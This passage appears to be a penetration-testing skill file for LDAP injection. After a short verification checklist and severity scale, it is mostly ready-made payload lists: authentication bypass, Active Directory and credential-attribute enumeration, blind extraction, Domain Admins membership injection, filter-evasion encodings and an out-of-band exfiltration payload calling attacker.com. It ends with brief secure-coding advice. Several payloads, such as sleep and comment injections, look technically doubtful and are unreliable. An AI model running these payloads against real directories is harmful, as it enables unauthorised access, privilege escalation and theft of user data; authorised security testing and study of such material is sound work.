- [ ] **Blind exfil:** each recovered char reproduces 3x with stable size; the
      FALSE control still reads FALSE between rounds; recovered value verified by
      a direct lookup or by the auth-bypass payload that uses it.
- [ ] **XPath:** quotes/brackets remained balanced (no 500), and the bypass logged
      in to a real account context — not just a different error page.
- [ ] **OOB where possible:** a Collaborator DNS/LDAP interaction from a referral
      payload is decisive for blind cases — prefer it over length-only inference.
- [ ] **AD claim discipline:** if you say "AD", you enumerated AD-specific attrs
      (`sAMAccountName`/`memberOf`); never claim AD hash exfil.

**Severity:**
- Auth bypass landing as admin/privileged directory entry: **Critical**
- `userPassword` hash exfil (non-AD) or `description`-field credential read: **High**
- AD user/group enumeration only: **Medium-High**
- Blind boolean oracle confirmed but no useful attribute reachable: **Medium**


### From `normal-skills/ldap.md`

## Overview

LDAP Injection is an attack technique used to exploit web applications that construct LDAP (Lightweight Directory Access Protocol) statements from user-supplied input. When an application fails to properly sanitize input, malicious LDAP filters can be injected to bypass authentication, enumerate directory contents, modify directory objects, or escalate privileges.

**LDAP Query Structure Context:**
- **DN (Distinguished Name):** `cn=John,ou=Users,dc=example,dc=com`
- **Filter Syntax:** `(&(attribute=value)(attribute2=value2))`
- **Operators:** `&` (AND), `|` (OR), `!` (NOT), `*` (wildcard), `=` (equality)

---

### 1.1 Error-Based Detection

Inject syntax-breaking payloads to trigger LDAP parser errors:

**Basic Syntax Probes:**
```
*
*)(
*))(((
(&
(|)
!
)(
)(
)(
```

**Error Signatures to Monitor:**
- `LDAPException` / `javax.naming.NamingException`
- `Invalid DN syntax` / `Bad search filter`
- `LDAP: error code 21` (Invalid attribute syntax)
- `LDAP: error code 32` (No such object)
- `LDAP: error code 34` (Invalid DN syntax)
- `Size limit exceeded`
- `Time limit exceeded`

**HTTP Response Indicators:**
- Status code changes (500 → 200 or vice versa)
- Response time anomalies (LDAP timeouts vs. quick errors)
- Stack traces revealing LDAP SDK (Spring LDAP, UnboundID, Novell)

### 1.2 Boolean-Based Detection

Use logically true/false conditions to infer injection:

**AND-Based Tests (True Condition):**
```
 legitimate)(cn=*))(&(cn=*
 legitimate))(&(cn=*
 legitimate*))(&(cn=*
```

**OR-Based Tests (True Condition):**
```
 *)(cn=*))(|(cn=*
 *)(objectClass=*))(|(objectClass=*
```

**Time-Differential Detection:**
```
 *)(objectClass=*)(|(objectClass=*))(&(|(objectClass=*
```

### 1.3 LDAP Server Fingerprinting

Determine backend type to tailor payloads:

| Indicator | Server Type |
|-----------|-------------|
| `objectClass=top` | OpenLDAP |
| `objectClass=organizationalPerson` | Active Directory |
| `sAMAccountName` attribute | Active Directory |
| `uid` attribute | OpenLDAP/389 DS |
| `cn` common naming | Generic LDAP |
| `distinguishedName` attribute | Active Directory |

**Fingerprinting Payloads:**
```
(objectClass=*)
(objectClass=top)
(objectClass=organizationalUnit)
(objectClass=domain)
(objectClass=posixAccount)
```

---

### 2.1 Classic Authentication Bypass

**Standard Login Form Structure:**
```
(&(uid=INPUT)(password=INPUT))
```

**Universal True Condition (AND Injection):**
```
*)(uid=*))(&(uid=*
```
**Resulting Query:** `(&(uid=*)(uid=*))(&(uid=*)(password=anything))` → Always true

**Payload Variants:**
```
*)(uid=*))(&(uid=*
*)(uid=*))(&(uid=*)(password=*
*)(uid=*))(&(uid=*)(|(password=*
*)(objectClass=*))(&(objectClass=*
*)(objectClass=top))(&(objectClass=*
*)(cn=admin))(&(cn=admin)(password=*
*)(cn=administrator))(&(cn=administrator)(password=*
*)(sAMAccountName=*))(&(sAMAccountName=*)(password=*
*)(userPrincipalName=*))(&(userPrincipalName=*)(password=*
*)(mail=*@domain.com))(&(mail=*@domain.com)(password=*
```

**Active Directory Specific:**
```
*)(sAMAccountName=*))(&(sAMAccountName=*
*)(userPrincipalName=*))(&(userPrincipalName=*
*)(cn=Domain Admins))(&(cn=Domain Admins)(member=*
*)(memberOf=CN=Domain Admins*))(&(memberOf=CN=Domain Admins*)(password=*
```

### 2.2 Wildcard Injection Techniques

**Password Field Wildcard Injection:**
```
*
*))
*)(objectClass=*
*)(cn=*
*)(uid=*
*)(mail=*
```

**DN Component Wildcard Injection:**
```
cn=*,dc=example,dc=com
uid=*,ou=Users,dc=example,dc=com
*,ou=Users,dc=example,dc=com
*\\*,dc=example,dc=com
```

### 2.3 Logical Operator Manipulation

**OR Injection for Universal Match:**
```
)(|(uid=*
)(|(objectClass=*
)(|(cn=*
)(|(mail=*
)(|(sAMAccountName=*
```

**NOT Operator Bypass:**
```
)(!(uid=nonexistent))(&(uid=*
)(!(objectClass=nonexistent))(&(objectClass=*
```

**Nested Boolean Injection:**
```
)(|(uid=*))(&(uid=*
)(|(objectClass=*))(&(objectClass=*
)(|(cn=*))(&(cn=*
)(|(mail=*))(&(mail=*
```

### 2.4 Comment/Null Byte Truncation

**Null Byte Injection (if supported):**
```
admin%00
*)(uid=admin%00
*)(uid=*%00
```

**Comment Injection (LDAPv3 extensible match):**
```
*)(uid=admin)/* 
*)(uid=*)/* 
```

---

### 3.1 DN Escape & Context Switching

**Base DN Traversal:**
```
dc=com
dc=example,dc=com
ou=Users,dc=example,dc=com
cn=admin,ou=Users,dc=example,dc=com
```

**Relative DN Injection:**
```
..\\,ou=Groups,dc=example,dc=com
..,ou=Groups,dc=example,dc=com
\\,ou=Administrators,dc=example,dc=com
```

**DN Component Injection:**
```
cn=admin,ou=Users,dc=example,dc=com
uid=admin,ou=Users,dc=example,dc=com
sAMAccountName=admin,dc=example,dc=com
```

### 3.2 Organizational Unit (OU) Traversal

**OU Enumeration via DN Manipulation:**
```
*)(ou=*)
*)(ou=*))(&(ou=*
*)(objectClass=organizationalUnit)
*)(objectClass=container)
*)(objectClass=domainDNS)
```

**Parent Domain Traversal:**
```
dc=*
dc=*)(dc=*
dc=*))(&(dc=*
```

### 3.3 Active Directory Specific Traversal

**Domain Controller Enumeration:**
```
*)(objectClass=domainDNS)
*)(objectClass=domain)
*)(nCName=*)
*)(distinguishedName=DC=*
```

**Forest/Tree Traversal:**
```
*)(objectClass=trustedDomain)
*)(trustParent=*)
*)(objectClass=crossRef)
```

---

### 4.1 Search Filter Expansion

**Universal Object Retrieval:**
```
*)(objectClass=*)
*)(objectClass=top)
*)(objectClass=organizationalPerson)
*)(objectClass=person)
*)(objectClass=user)
*)(objectClass=posixAccount)
*)(objectClass=inetOrgPerson)
```

**Attribute-Specific Enumeration:**
```
*)(uid=*)
*)(cn=*)
*)(mail=*)
*)(telephoneNumber=*)
*)(givenName=*)
*)(sn=*)
*)(employeeNumber=*)
*)(departmentNumber=*)
*)(title=*)
*)(l=*)
*)(st=*)
*)(c=*)
```

### 4.2 Active Directory Attribute Harvesting

**Critical AD Attributes:**
```
*)(sAMAccountName=*)
*)(userPrincipalName=*)
*)(displayName=*)
*)(givenName=*)
*)(sn=*)
*)(mail=*)
*)(telephoneNumber=*)
*)(homePhone=*)
*)(mobile=*)
*)(pager=*)
*)(facsimileTelephoneNumber=*)
*)(streetAddress=*)
*)(l=*)
*)(st=*)
*)(postalCode=*)
*)(c=*)
*)(co=*)
*)(department=*)
*)(company=*)
*)(title=*)
*)(description=*)
*)(manager=*)
*)(directReports=*)
*)(memberOf=*)
*)(primaryGroupID=*)
*)(userAccountControl=*)
*)(pwdLastSet=*)
*)(lastLogon=*)
*)(lastLogonTimestamp=*)
*)(accountExpires=*)
*)(logonCount=*)
*)(badPwdCount=*)
*)(badPasswordTime=*)
*)(objectSid=*)
*)(sidHistory=*)
```

**Credential-Related Attributes:**
```
*)(userPassword=*)
*)(unicodePwd=*)
*)(unixUserPassword=*)
*)(authPassword=*)
*)( krbPrincipalName=*)
*)(krb5Key=*)
```

### 4.3 Bulk User Enumeration

**User Object Retrieval:**
```
(&(objectClass=user)(objectCategory=person))
(&(objectClass=organizationalPerson)(objectClass=person))
(&(objectClass=inetOrgPerson)(uid=*))
(&(objectClass=posixAccount)(uid=*))
```

**Group Membership Enumeration:**
```
(&(objectClass=group)(member=*))
(&(objectClass=groupOfNames)(member=*))
(&(objectClass=groupOfUniqueNames)(uniqueMember=*))
(&(objectClass=posixGroup)(memberUid=*))
```

**Nested Group Resolution:**
```
(&(objectClass=group)(member:1.2.840.113556.1.4.1941:=*))
(&(objectClass=group)(memberOf:1.2.840.113556.1.4.1941:=*))
```

---

### 5.1 Extensible Match Injection

**LDAPv3 Extensible Match Syntax:**
```
(attr:rule:=value)
(attr:dn:rule:=value)
(attr:dn:=value)
```

**Extensible Match Payloads:**
```
*)(uid:caseExactMatch:=admin)
*)(uid:dn:caseExactMatch:=admin)
*)(userPassword:2.16.840.1.113730.3.3.2.1.1:=*
*)(member:dn:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=example,DC=com)
```

### 5.2 Attribute Existence Testing

**Presence Testing for Reconnaissance:**
```
*)(attributeName=*)
*)(attributeName=*)(&(attributeName=*
```

**Attribute Existence Enumeration:**
```
*)(objectClass=*)(attribute1=*)
*)(objectClass=*)(attribute1=*)(attribute2=*)
*)(objectClass=*)(attribute1=*)(attribute2=*)(attribute3=*)
```

### 5.3 Substring & Range Attacks

**Substring Search Injection:**
```
a*
ab*
abc*
abcd*
```

**Range Retrieval (AD-specific):**
```
*)(member;range=0-1499=*)
*)(member;range=1500-2999=*)
*)(member;range=3000-4499=*)
```

**Incremental Character Enumeration:**
```
a*)(cn=a*
b*)(cn=b*
c*)(cn=c*
...
0*)(cn=0*
1*)(cn=1*
```

---

### 6.1 Boolean-Based Blind Extraction

**Character Enumeration Payload:**
```
*)(cn=admin))(&(cn=a*
*)(cn=admin))(&(cn=b*
*)(cn=admin))(&(cn=c*
...
*)(cn=admin))(&(cn=admin*
*)(cn=admin))(&(cn=admia*
*)(cn=admin))(&(cn=admib*
```

**Binary Search Optimization:**
```
*)(cn>=m))(&(cn>=m*
*)(cn>=g))(&(cn>=g*
*)(cn>=j))(&(cn>=j*
```

### 6.2 Time-Based Blind Injection

**Server-Side Sleep Injection (if supported):**
```
*)(|(objectClass=*)(delay=5000))
*)(objectClass=*)(|(objectClass=*)(wait=5))
```

**Resource Exhaustion Timing:**
```
*)(objectClass=*)(|(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*))
```

**Active Directory Specific Delays:**
```
*)(objectClass=*)(|(objectClass=*)(!(objectClass=nonexistent)))
*)(objectClass=*)(|(objectClass=*)(|(objectClass=*)(objectClass=*)))
```

### 6.3 Out-of-Band (OOB) Exfiltration

**DNS Exfiltration (if LDAP URL resolution):**
```
*)(objectClass=*)(|(objectClass=*)(ldap://attacker.com/dc=example,dc=com))
*)(objectClass=*)(|(objectClass=*)(ldaps://attacker.com:636/))
```

---

### 7.1 Group Membership Injection

**Add Self to Group (if write access):**
```
)(member=CN=Attacker,OU=Users,DC=example,DC=com))(&(member=*
)(uniqueMember=uid=attacker,ou=users,dc=example,dc=com))(&(uniqueMember=*
```

**Administrative Group Targeting:**
```
)(memberOf=CN=Domain Admins,CN=Users,DC=example,DC=com))(&(memberOf=*
)(memberOf=CN=Enterprise Admins,CN=Users,DC=example,DC=com))(&(memberOf=*
)(memberOf=CN=Schema Admins,CN=Users,DC=example,DC=com))(&(memberOf=*
)(memberOf=CN=Administrators,CN=Builtin,DC=example,DC=com))(&(memberOf=*
```

### 7.2 Password Reset Injection

**Password Change Filter Injection:**
```
)(unicodePwd:=newpassword))(&(unicodePwd=*
)(userPassword:=newpassword))(&(userPassword=*
```

### 7.3 Account Manipulation

**Enable/Disable Account (userAccountControl):**
```
)(userAccountControl:=512))(&(userAccountControl=*
)(userAccountControl:=66048))(&(userAccountControl=*
```

---

### 8.1 Encoding Techniques

**URL Encoding:**
```
%2a)(uid=%2a))(%26(uid=%2a
%2a)(objectClass=%2a))(%26(objectClass=%2a
```

**Double URL Encoding:**
```
%252a)(uid=%252a))(%2526(uid=%252a
```

**Unicode Normalization:**
```
%u002a)(uid=%u002a))(%u0026(uid=%u002a
```

### 8.3 Whitespace Substitution

**Whitespace Alternatives:**
```
*)(uid=*))(&(uid=*
*)(uid=%09*))(&(uid=%09*
*)(uid=%0a*))(&(uid=%0a*
*)(uid=%0d*))(&(uid=%0d*
*)(uid=%0b*))(&(uid=%0b*
*)(uid=%0c*))(&(uid=%0c*
*)(uid=%a0*))(&(uid=%a0*
```

### 8.4 Comment Injection

**LDAP Comments (if parser supports):**
```
*)(uid=admin)/*comment*/))(&(uid=*
*)(objectClass=*)/*comment*/))(&(objectClass=*
```

---

### 9.1 Login Form Variants

**Username-Only Field:**
```
*)(uid=*))(&(uid=*
*)(cn=*))(&(cn=*
*)(mail=*))(&(mail=*
*)(sAMAccountName=*))(&(sAMAccountName=*
*)(userPrincipalName=*))(&(userPrincipalName=*
```

**Password-Only Field (if used in filter):**
```
*)(password=*))(&(password=*
*)(userPassword=*))(&(userPassword=*
```

**Both Fields Injection:**
```
Username: *)(uid=*))(&(uid=*
Password: *)
```

### 9.2 Search/Directory Interface

**Search Filter Injection:**
```
*)(objectClass=*)
*)(uid=*)
*)(cn=*)
*)(mail=*)
*)(telephoneNumber=*)
*)(givenName=*)
*)(sn=*)
```

**Advanced Search Operators:**
```
(&(objectClass=user)(|(cn=*)(sn=*)(mail=*)(telephoneNumber=*)))
(&(objectClass=group)(|(cn=*)(description=*)))
(&(objectClass=organizationalUnit)(|(ou=*)(description=*)))
```

### 9.3 Password Reset Interface

**Identity Verification Bypass:**
```
*)(uid=*))(&(uid=*
*)(mail=*))(&(mail=*
*)(employeeNumber=*))(&(employeeNumber=*
*)(cn=*))(&(cn=*
```

---

### 10.1 Fuzzing Payload Lists

**Minimal High-Impact Set:**
```
*
*)(uid=*
*)(cn=*
*)(objectClass=*
*)(objectClass=top
*)(objectClass=person
*)(objectClass=organizationalPerson
*)(uid=*))(&(uid=*
*)(cn=*))(&(cn=*
*)(objectClass=*))(&(objectClass=*
*)(sAMAccountName=*))(&(sAMAccountName=*
*)(userPrincipalName=*))(&(userPrincipalName=*
*)(mail=*))(&(mail=*
*)(memberOf=*))(&(memberOf=*
```

**Comprehensive Fuzzing List:**
```
*)(uid=*)
*)(uid=*))(&(uid=*
*)(uid=*))(&(uid=*)(password=*
*)(cn=*)
*)(cn=*))(&(cn=*
*)(cn=*))(&(cn=*)(password=*
*)(objectClass=*)
*)(objectClass=*))(&(objectClass=*
*)(objectClass=top)
*)(objectClass=top))(&(objectClass=top
*)(objectClass=person)
*)(objectClass=organizationalPerson)
*)(objectClass=inetOrgPerson)
*)(objectClass=user)
*)(objectClass=group)
*)(objectClass=domain)
*)(objectClass=domainDNS)
*)(sAMAccountName=*)
*)(sAMAccountName=*))(&(sAMAccountName=*
*)(userPrincipalName=*)
*)(userPrincipalName=*))(&(userPrincipalName=*
*)(mail=*)
*)(mail=*))(&(mail=*
*)(telephoneNumber=*)
*)(givenName=*)
*)(sn=*)
*)(employeeNumber=*)
*)(title=*)
*)(department=*)
*)(company=*)
*)(manager=*)
*)(memberOf=*)
*)(member=*)
*)(userAccountControl=*)
*)(objectSid=*)
*)(distinguishedName=*)
*)(name=*)
*)(displayName=*)
*)(description=*)
*)(homeDirectory=*)
*)(scriptPath=*)
*)(profilePath=*)
*)(userWorkstations=*)
*)(logonHours=*)
*)(primaryGroupID=*)
*)(groupType=*)
*)(adminCount=*)
*)(instanceType=*)
*)(whenCreated=*)
*)(whenChanged=*)
*)(pwdLastSet=*)
*)(lastLogon=*)
*)(lastLogonTimestamp=*)
*)(accountExpires=*)
*)(logonCount=*)
*)(badPwdCount=*)
*)(badPasswordTime=*)
*)(lockoutTime=*)
```

### 10.2 Response Analysis Patterns

**True Condition Indicators:**
- Successful authentication
- Search results returned
- Profile page displayed
- Redirect to dashboard
- Status 200 with content
- Response time < baseline

**False Condition Indicators:**
- Authentication failure
- Empty search results
- Error page displayed
- Redirect to login
- Status 401/403
- Response time > baseline (potential blind)

---

### 11.1 Secure Coding Patterns

**Parameterized LDAP Queries (Java/JNDI):**
```java
// VULNERABLE
String filter = "(uid=" + userInput + ")";
NamingEnumeration results = ctx.search(baseDN, filter, null);

// SECURE
String filter = "(uid={0})";
Object[] args = new Object[]{userInput};
NamingEnumeration results = ctx.search(baseDN, filter, args, null);
```

**Parameterized LDAP Queries (Python/ldap3):**
```python

# SECURE
conn.search('dc=example,dc=com', '(uid=%s)', parameters=[user_input])
```

**Input Validation (Whitelist Approach):**
```python
import re
def validate_ldap_input(input_string):
    # Allow only alphanumeric and specific safe characters
    if not re.match(r'^[a-zA-Z0-9._@-]+$', input_string):
        raise ValueError("Invalid LDAP input")
    return input_string
```

**DN Escape Function:**
```python
def escape_ldap_dn(dn_component):
    escape_chars = {
        '\\': '\\\\',
        ',': '\\,',
        '+': '\\+',
        '"': '\\"',
        '<': '\\<',
        '>': '\\>',
        ';': '\\;',
        '=': '\\=',
        '\x00': '\\00',
        '\n': '\\0a',
        '\r': '\\0d'
    }
    for char, replacement in escape_chars.items():
        dn_component = dn_component.replace(char, replacement)
    return dn_component
```

**Filter Escape Function:**
```python
def escape_ldap_filter(filter_input):
    escape_chars = {
        '\\': '\\\\',
        '*': '\\2a',
        '(': '\\28',
        ')': '\\29',
        '\x00': '\\00',
        '/': '\\2f'
    }
    for char, replacement in escape_chars.items():
        filter_input = filter_input.replace(char, replacement)
    return filter_input
```

### 11.2 Defense Layers

1. **Input Validation:** Whitelist allowed characters (alphanumeric, limited punctuation)
2. **Parameterization:** Use LDAP bind variables and prepared statements
3. **Escaping:** Properly escape special LDAP characters (`*`, `(`, `)`, `\`, `\0`)
4. **Least Privilege:** Run LDAP queries with read-only, limited-scope credentials
5. **Output Encoding:** Encode LDAP query results before display
6. **Error Handling:** Generic error messages, no LDAP error details exposed
7. **Logging:** Log all LDAP queries with parameters for audit

---

## Quick Reference: Payload Matrix

| Target | Payload | Expected Result |
|--------|---------|-----------------|
| Auth Bypass (AND) | `*)(uid=*))(&(uid=*` | Universal match |
| Auth Bypass (OR) | `)(|(uid=*` | Universal match |
| Wildcard Pass | `*` | Match any password |
| User Enum | `*)(objectClass=user)` | All user objects |
| Group Enum | `*)(objectClass=group)` | All group objects |
| AD Specific | `*)(sAMAccountName=*)` | All AD accounts |
| DN Traversal | `*,dc=example,dc=com` | Root DN listing |
| Attribute Harvest | `*)(mail=*)(cn=*)(sn=*)` | Multi-attribute dump |
| Blind True | `*)(cn=a*` | Conditional response |
| Blind False | `*)(cn=zzz*` | No response |

---

## Testing Checklist

- [ ] Detect LDAP injection points (login, search, password reset)
- [ ] Fingerprint LDAP server type (OpenLDAP, AD, 389 DS)
- [ ] Test authentication bypass with wildcard injection
- [ ] Test authentication bypass with logical operator injection
- [ ] Test directory traversal via DN manipulation
- [ ] Enumerate directory schema and attributes
- [ ] Extract bulk user/group listings
- [ ] Test for blind LDAP injection (boolean/time-based)
- [ ] Attempt privilege escalation via group membership
- [ ] Test WAF/filter evasion techniques
- [ ] Verify input sanitization and parameterization
- [ ] Document all findings with proof-of-concept
```
